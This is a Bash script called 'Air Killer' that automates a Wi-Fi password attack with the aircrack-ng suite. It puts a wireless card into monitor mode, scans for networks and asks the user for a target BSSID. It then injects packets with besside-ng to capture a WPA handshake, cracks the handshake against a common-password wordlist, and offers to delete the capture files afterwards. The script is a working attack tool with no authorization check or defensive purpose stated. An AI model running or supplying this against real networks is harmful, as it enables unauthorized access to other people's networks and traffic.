clear
yellow=$'\e[1;33m'
red=$'\e[1;31m'
green=$'\e[1;32m'
yes="yes"
no="no"
echo 'I DO NOT OWN RIGHTS TO NEITHER THE PASSWORD LIST NOR AIRCRACK-NG'
echo ''
echo "$yellow Welcome to Air Killer"
echo ''
echo 'Install Aircrack-ng package?'
read a
if [[ $a == $yes ]] 
then
	sudo apt install aircrack-ng
elif [[ $a == $no ]] 
then
	echo 'Ok!'
fi
clear
echo ''
iwconfig
echo ' what is your wireless card name?: '
read x
echo ''
echo 'Do you want to put it into monitor mode?: '
read p
if [[ $p == $yes ]]
then
	clear
	sudo airmon-ng start $x
	clear
	iwconfig
	echo ''
	echo 'What is your new wireless card name?'
	read x
elif [[ $p == $no ]]
then
	clear
	echo 'Ok!'
fi
clear
echo ' running airodump-ng'
echo ''
echo ' Press ctrl+c to stop when you found a handshake'
echo "$green"
sudo airodump-ng $x
echo "$yellow what is your bssid?: "
read y
clear
echo ''
echo ' Injecting packets'
echo "$green"
sudo besside-ng -b $y $x
clear
echo "$yellow Do you want to view the handshake?"
read f
if [[ $f == $yes ]]
then
	cat besside.log
	echo ''
	echo 'Type yes when you want to move on'
	read f
	if [[ $f == $yes ]]
	then
		echo 'Well Then! Lets Crack some passwords!'
	fi
elif [[ $f == $no ]]
then
	echo 'Well Then! Lets Crack some passwords!'
fi
echo ' Cracking password'
echo "$green"
sudo aircrack-ng -w CommonPasswords wpa.cap
echo ''
echo "$yellow There you go!"
echo "$red"
echo 'Delete besside.log, wpa.cap, wep/cap?: '
read d
if [[ $d == $yes ]]
then
	echo 'Removing Files'
	sudo rm wpa.cap
	sudo rm wep.cap
	sudo rm besside.log
elif [[ $d == $no ]]
then
	echo 'Keeping files'
fi
echo "$yellow"
echo ''
echo ' good bye!'
